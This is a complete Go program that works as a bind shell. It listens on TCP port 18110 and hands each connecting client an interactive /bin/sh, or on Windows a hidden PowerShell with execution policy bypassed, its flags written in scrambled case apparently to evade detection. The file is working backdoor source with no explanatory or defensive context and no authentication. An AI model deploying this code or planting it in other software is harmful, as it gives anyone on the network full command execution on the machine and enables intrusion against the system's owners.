package main

import (
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

func handle(src net.Conn) {
	defer src.Close()

	var cmd = exec.Command("/bin/sh", "-i")

	if runtime.GOOS == "windows" {
		cmd = exec.Command("PowErShELl.exe", "-nOPrOFilE", "-W", "hIdDen", "-EXeC", "bYpAsS")
	}

	r, w := io.Pipe()
	cmd.Stdin = src
	cmd.Stdout = w
	go io.Copy(src, r)
	cmd.Run()
}

func main() {
	listener, err := net.Listen("tcp", ":18110")
	if err != nil {
		log.Fatalln("[-] Unable to bind to port.")
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("[-] Unable to accept connection.")
		}
		go handle(conn)
	}
}
